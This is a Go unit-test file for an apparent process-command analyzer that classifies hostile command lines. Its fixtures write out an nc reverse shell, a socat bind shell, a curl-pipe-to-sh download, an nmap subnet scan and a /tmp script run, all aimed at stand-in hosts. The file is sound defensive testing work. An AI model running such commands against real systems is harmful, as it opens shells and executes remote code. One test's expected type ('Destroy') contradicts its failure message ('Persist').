package proc

import "testing"

func TestAnalyzeCommandReverseShell(t *testing.T) {

	program := programWithArguments("nc", "/bin/nc", "nc", "-e", "/bin/sh", "203.0.113.7", "4444")
	incidents := AnalyzeCommand("test", "2026-10-29 10:00:00", program)

	if len(incidents) == 0 || incidents[0].Type != "Exfil" {
		t.Fatalf("Expected Exfil incident, got %#v", incidents)
	}

}

func TestAnalyzeCommandDownloadAndExecute(t *testing.T) {

	program := programWithArguments("sh", "/bin/sh", "sh", "-c", "curl http://example.test/x | sh")
	incidents := AnalyzeCommand("test", "2026-10-29 10:00:00", program)

	if len(incidents) == 0 || incidents[0].Type != "Destroy" {
		t.Fatalf("Expected Destroy incident, got %#v", incidents)
	}

}

func TestAnalyzeCommandScanner(t *testing.T) {

	program := programWithArguments("nmap", "/usr/bin/nmap", "nmap", "-sV", "203.0.113.0/24")
	incidents := AnalyzeCommand("test", "2026-10-29 10:00:00", program)

	if len(incidents) == 0 || incidents[0].Type != "Recon" {
		t.Fatalf("Expected Recon incident, got %#v", incidents)
	}

}

func TestAnalyzeCommandScriptInWritablePath(t *testing.T) {

	program := programWithArguments("sh", "/bin/sh", "sh", "/tmp/evil.sh")
	incidents := AnalyzeCommand("test", "2026-10-29 10:00:00", program)

	if len(incidents) == 0 || incidents[0].Type != "Destroy" {
		t.Fatalf("Expected Persist incident, got %#v", incidents)
	}

}

func TestAnalyzeCommandLocalFinding(t *testing.T) {

	program := programWithArguments("socat", "/usr/bin/socat", "socat", "TCP-LISTEN:4444,reuseaddr", "EXEC:/bin/sh")
	incidents := AnalyzeCommand("test", "2026-10-29 10:00:00", program)

	if len(incidents) == 0 || incidents[0].Type != "Destroy" {
		t.Fatalf("Expected Destroy incident, got %#v", incidents)
	}

}
